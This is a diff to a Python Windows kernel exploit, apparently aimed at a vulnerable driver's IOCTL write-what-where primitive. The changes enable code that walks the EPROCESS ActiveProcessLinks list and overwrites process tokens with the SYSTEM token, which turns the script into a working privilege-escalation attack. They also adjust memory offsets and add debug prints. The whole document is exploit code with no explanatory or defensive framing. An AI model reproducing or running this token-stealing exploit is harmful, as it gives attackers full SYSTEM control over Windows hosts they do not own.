@@ -36,11 +36,11 @@ ThreadBasicInformation = 0
 
 USER_ADDR = 0x000000001a000000
 USER_ADDR_OFFSET = USER_ADDR + 0x1000 # Arbitrary offset inside BASEADDRESS 
-USER_ADDR_OFFSET2 = USER_ADDR + 0x2000 # Arbitrary offset inside BASEADDRESS 
+USER_ADDR_OFFSET2 = USER_ADDR + 0x1000 # Arbitrary offset inside BASEADDRESS 
 USER_MEM_PAGE_PTR = USER_ADDR + 0x000 # Requires 16 byte offset in our defined user memory.
 CURRENT_PROCESS_HANDLE = 0xFFFFFFFFFFFFFFFF
 BASEADDRESS = c_ulonglong(USER_ADDR)
-ALLOCATED_USER_MEM_SZ = c_ulonglong(0x3000)
+ALLOCATED_USER_MEM_SZ = c_ulonglong(0x8000)
 
 ###################################################### CHOSEN IOCTL CODE ##########################################################
 
@@ -313,23 +313,28 @@ def executeOverwrite():
         
         while True:
             flink = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
+            print "Flink is: " + hex(flink)
             flinkEPROCESS = flink - ACTIVE_PROC_LINK_OFFSET
+            print "FlinkEPROCESS (flink-2e8) is: " + hex(flinkEPROCESS)
 
-            print "Current active link is: " + hex(flink)
             nextEPROCESSflink = flinkEPROCESS + ACTIVE_PROC_LINK_OFFSET
+            print "nextFlink is: " + hex(flinkEPROCESS + ACTIVE_PROC_LINK_OFFSET)
+
             deref_ptr_nextEPROCESS = readValueatAddress(driver, nextEPROCESSflink, USER_ADDR_OFFSET)
             nextflink = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
+            print "That pointer points to nextFlink: " + hex(nextflink)
 
-            print "Next active link is: " + hex(nextflink)
-            #where = flinkEPROCESS+TOKEN_OFFSET
-            #writeWhatWhere(driver, system_token_value, where)
+           
+            where = flinkEPROCESS+TOKEN_OFFSET
+            print "Writing to: " + hex(where)
+            writeWhatWhere(driver, system_token_value, where)
 
             flink = nextflink
 
 
             total_writes = total_writes + 1
 
-            if total_writes > 15:
+            if total_writes >2:
                 break
         
 
